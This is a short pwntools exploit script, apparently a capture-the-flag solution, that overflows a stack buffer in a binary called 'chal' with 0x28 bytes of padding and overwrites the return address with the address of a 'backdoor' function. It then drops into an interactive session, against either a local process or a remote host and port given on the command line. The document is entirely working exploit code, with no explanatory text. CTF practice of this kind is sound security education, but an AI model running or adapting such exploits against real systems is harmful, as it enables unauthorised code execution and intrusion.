from pwn import *
import sys

"""
00000000004011b6 <backdoor>:
  4011b6:       f3 0f 1e fa             endbr64
  4011ba:       55                      push   rbp
  4011bb:       48 89 e5                mov    rbp,rsp
  4011be:       48 8d 3d 3f 0e 00 00    lea    rdi,[rip+0xe3f]        # 402004 <_IO_stdin_used+0x4>
"""
bd = 0x00000000004011BB
padding = b"A" * 0x28

if len(sys.argv) == 1:
    r = process("./chal")
    # gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)

r.sendlineafter(b"> ", padding + p64(bd))
r.recvuntil(b"!")
r.interactive()
